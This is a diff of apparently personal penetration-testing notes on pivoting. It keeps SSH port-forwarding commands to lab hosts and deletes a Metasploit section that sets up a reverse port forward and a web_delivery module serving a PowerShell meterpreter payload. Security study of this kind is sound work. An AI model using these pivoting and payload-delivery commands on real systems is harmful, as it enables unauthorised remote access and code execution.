@@ -46,15 +46,4 @@ ssh -L 7000:10.10.10.128:22 lab@192.168.100.137 -Nf
 ssh -L 0.0.0.0:9999:10.10.10.128:80 lab@192.168.100.137 -Nf
 ssh lab@127.0.0.1 -p 7000
 ```
-### Metasploit
-```
-portfwd add -R -p 8080 -L 92.168.100.111 -l 443 or setg Proxies socks4:192.168.100.100:1080
-msf5 > use exploit/multi/script/web_delivery
-msf5 exploit(multi/script/web_delivery) > set target 2
-msf5 exploit(multi/script/web_delivery) > set SRVHOST 92.168.100.111
-msf5 exploit(multi/script/web_delivery) > set SRVPORT 775
-msf5 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/bind_tcp
-msf5 exploit(multi/script/web_delivery) > set EXITFUNC thread
-msf5 exploit(multi/script/web_delivery) > set URIPATH /msf.ps1
-msf5 exploit(multi/script/web_delivery) > exploit -j
-```
+
